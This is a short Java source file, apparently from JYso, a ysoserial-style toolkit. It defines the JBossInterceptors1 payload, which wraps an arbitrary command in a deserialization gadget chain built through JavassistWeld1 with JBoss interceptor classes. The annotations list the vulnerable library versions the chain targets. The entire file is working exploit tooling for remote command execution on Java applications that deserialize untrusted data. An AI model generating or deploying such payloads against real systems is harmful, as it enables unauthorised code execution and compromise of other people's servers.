package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;

import static com.qi4l.JYso.gadgets.JavassistWeld1.get_chain;

@SuppressWarnings({"unused"})
@Dependencies({"javassist:javassist:3.12.1.GA", "org.jboss.interceptor:jboss-interceptor-core:2.0.0.Final",
        "javax.enterprise:cdi-api:1.0-SP1", "javax.interceptor:javax.interceptor-api:3.1",
        "org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final", "org.slf4j:slf4j-api:1.7.21"})
@Authors({Authors.MATTHIASKAISER})
public class JBossInterceptors1 implements ObjectPayload<Object> {

    public Object getObject(String command) throws Exception {
        return get_chain(command, null, org.jboss.interceptor.spi.model.InterceptionType.POST_ACTIVATE);
    }
}
